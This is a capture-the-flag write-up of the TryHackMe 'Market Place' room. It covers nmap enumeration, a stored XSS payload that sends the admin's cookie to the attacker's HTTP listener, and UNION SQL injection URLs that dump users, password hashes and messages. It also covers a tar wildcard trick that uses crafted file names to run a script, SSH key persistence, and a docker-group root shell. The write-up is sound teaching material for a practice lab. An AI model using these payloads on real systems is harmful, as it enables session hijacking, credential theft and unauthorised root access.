---
title: "TryHackMe - Market Place"
author: Nasrallah
description: ""
date: 2022-10-15 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, xss, cookie, sqli, mysql, docker, wildcard, tar]
img_path: /assets/img/tryhackme/marketplace
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Market Place](https://tryhackme.com/room/marketplace) from [TryHackMe](https://tryhackme.com). The machine is running a web server with couple of vulnerabilities. We start by exploiting a XSS vulnerability to get admin cookie, then we use sql injection to read sensitive information in the database where we find ssh password. After gaining a foothold, we exploit a wildcard misconfiguration to escalate horizontally, then we abuse docker to get root.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.255.211
Host is up (0.11s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
| http-robots.txt: 1 disallowed entry 
|_/admin
32768/tcp open  http    Node.js (Express middleware)
|_http-title: The Marketplace
| http-robots.txt: 1 disallowed entry 
|_/admin
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found three open ports on an Ubuntu linux machine. There is port 22 running OpenSSH, port 80 running nginx and port 32768 running Node.js.

### Web

Let's navigate to the web page on port 80.

![](1.png)

Here we have a market place where people can sell there stuff. Let's sign up and login.

![](2.png)

It seems that we also can add our own listing.

![](3.png)

The title and the description are displayed. Let's check for XSS vulnerabilities.

![](4.png)

After submitting the query, we successfully get the alert.

![](5.png)

One interesting thing we see is that we can report a listing to the admins, and the sites uses cookies.

![](6.png)

We can use that to our advantage and try steal the admin's cookie.

Let's create a new listing and put the following script in the description.

```js
<script>fetch('http:10.10.10.10/'+document.cookie)</script> xss
```

>Change the ip address to your tun0 ip.

![](7.png)

Now go the the terminal and setup an http web server to catch the cookie with the following command:

```bash
python3 -m http.server 80
```

Now submit the query, and then report it to the admins.

![](8.png)

Great! We got the admin's cookie. Now change the current cookie to the one we just got and refresh the page.

![](9.png)

We got a new panel, let's take look at it.

![](10.png)

Here we can see information about different users, for example we see that user jake and michael are administrators.

Clicking on one of the users we get redirected to `http://10.10.109.12/admin?user=2`.

![](11.png)

## **Foothold**

Let's try adding an `'` to the user parameter.

![](12.png)

The parameter is vulnerable to sql injection, and we see that the database in use is MySql.

First we need to determine the number of columns in the query, we do that with `ORDER BY 1` payload, and we keep increasing the number until we get an error.

![](13.png)

We got an error on 5 which means there are 4 columns.

Now we need to find the right columns where we can do our sql injection. We can use the following payload.

```text
12 UNION SELECT 5,7,3,4
```

![](14.png)

We changed the value of user to a one that doesn't exist for it to work.

To get the name of the database, we use the following query.

```text
http://10.10.109.12/admin?user=12 UNION SELECT 5,database(),3,4
```

![](15.png)

To list the tables, we use the following query.

```text
http://10.10.109.12/admin?user=12 UNION SELECT 5,group_concat(table_name),3,4 fRoM+information_schema.tables+wHeRe+table_schema=database()
```

![](16.png)

We found a table named `users`. Let's list the tables columns with the following query.

```
http://10.10.109.12/admin?user=12 UNION SELECT 5,group_concat(column_name),3,4 fRoM+information_schema.columns+wHeRe+table_name='users'
```

![](17.png)

Now we dump the usernames and passwords with this query.

```text
http://10.10.109.12/admin?user=12 UNION SELECT 5,group_concat(username,password),3,4 from users;
```

![](18.png)

We got hashed password, before we try to crack them, let's take a look at the other tables.


Let's check the messages table with the following query.

```text
http://10.10.109.12/admin?user=12 UNION SELECT 5,group_concat(column_name),3,4 fRoM+information_schema.columns+wHeRe+table_name='messages'
```

![](19.png)

Let's see what's on the `message_content` column.

```text
http://10.10.109.12/admin?user=12 UNION SELECT 5,group_concat(message_content),3,4 from messages;
```

![](20.png)

We got a password for ssh. Let's try logging with one of the two users we found.

![](21.png)

We managed to login as `jake`.

## **Privilege Escalation**

Let's check our privileges with `sudo -l`.

```terminal
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh

```

We can run a shell script called backup as user michael. Let's check the file.

![](22.png)

The script runs `tar` with a wildcard. There is this useful [article](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) that describes how to exploit wildcard, let's follow the steps.

```bash
jake@the-marketplace:/tmp$ echo 'cp /bin/bash /tmp/michael && chmod +s /tmp/michael' > shell.sh
jake@the-marketplace:/tmp$ chmod +x shell.sh
jake@the-marketplace:/tmp$ echo "" > "--checkpoint-action=exec=sh shell.sh"
jake@the-marketplace:/tmp$ echo "" > --checkpoint=1
jake@the-marketplace:/tmp$ mv /opt/backups/backup.tar backup.tar.bak
jake@the-marketplace:/tmp$ sudo -u michael /opt/backups/backup.sh
```

![](23.png)

By running '/tmp/michael -p', we get michael's shell.

After that i uploaded my ssh public key to michael's ssh directory and put it in authorized keys.

![](24.png)

Now i can ssh to the machine as michael without a password.

![](25.png)

By running the command `id`, we see that michael is part of docker group. Let's check [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell).

![](26.png)

We can run the following command to get root shell.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![](27.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
